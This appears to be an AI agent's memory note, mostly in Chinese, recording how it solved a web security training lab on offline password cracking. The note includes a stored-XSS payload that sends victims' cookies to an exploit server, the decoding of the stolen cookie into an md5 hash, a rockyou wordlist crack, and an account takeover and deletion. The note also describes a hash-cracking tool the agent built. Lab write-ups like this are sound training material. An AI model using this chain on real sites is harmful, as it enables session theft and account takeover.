---
metadata:
  node_type: memory
name: "PRS arm A lab-offline-password-cracking"
description: "arm A 基线:lab-offline-password-cracking 冷实例一次通过 - 评论存储 XSS 窃 carlos stay-logged-in cookie,base64 解出 md5 哈希,rockyou 破出 onceuponatime,登录后凭 password 确认删号,banner solved;新件 md5_crack 1.1.0"
last_updated: 2026-10-09T08:23:43+08:00
created: 2026-10-09T08:23:43+08:00
---

## 2026-10-09 arm A 基线:lab-offline-password-cracking 一次通过

- 题面:用户名/口令哈希存在 cookie 里,评论处有存储 XSS;取 carlos 的 stay-logged-in、破其口令、以 carlos 登录并删号。
- 实例 0a59003103d07f3a806ce92e00b100af(冷实例 reused:false)。banner 内有 exploit server(exploit-0ab200fb03d67fc980b7e8ac01e10093),range_launch 的 exploit_server 扫描却回 null ⇒ 以 banner 的 exploit-link 为准。
- 窃取链:评论体 `<script>fetch('https://exploit-.../'+document.cookie)</script>`;exploit server 存 302 页 body=`<script>location='<lab>/post?postId=1'</script>`;POST / `formAction=DELIVER_TO_VICTIM --follow`(302→/deliver-to-victim→302→/);GET /log 取 victim 行。
- victim 行给出 `stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`,b64 解出 `carlos:26323c16d5f4dabff3bb136f2460a943`。
- cookie 格式实证:以 wiener:peter 带 stay-logged-in 登录,cookie b64 解出 `wiener:51dc30ddc473d43a6011e9ebba6ca770`,正是 md5("peter") ⇒ 格式 = base64(username + ":" + md5(password))。
- 破解:先 100 条 / xato 100k / xato 1M 均不中;rockyou.txt(14,344,391 行,SecLists Passwords/Leaked-Databases/rockyou.txt.tar.gz)命中第 116147 行 → `onceuponatime`。
- 收口:POST /login carlos:onceuponatime → /my-account;POST /my-account/delete 只出「Are you sure?」确认页(required password)→ 再 POST password=onceuponatime → 302 首页,banner `is-solved` + congrats。
- 新件 `md5_crack` 1.1.0(.pi-rs/rust-scripts):`<hash> (--wordlist FILE | --words 'a,b') [--mask lower|digits|alnum|hexlower] [--max-len N] [--selftest]`,词表优先 + 可选穷举,信封给 password/source/tried/elapsed_ms。
- 件面坑一:大正文走 http_session 会报 `response too big for into_string`(8.5MB 起);大文件下载改用 `bin_get`(53MB tar.gz 正常,报 bytes)。
- 件面坑二:rockyou 含非 UTF-8 行,词表必须按字节读再逐行 from_utf8,失败的整行跳过(md5_crack 报 non_utf8_lines_skipped=218),整文件 read_to_string 会直接失败。
- 全程走件(http_session/bin_get/b64/nap/md5_crack;tar 仅解包一次),未 git 提交。

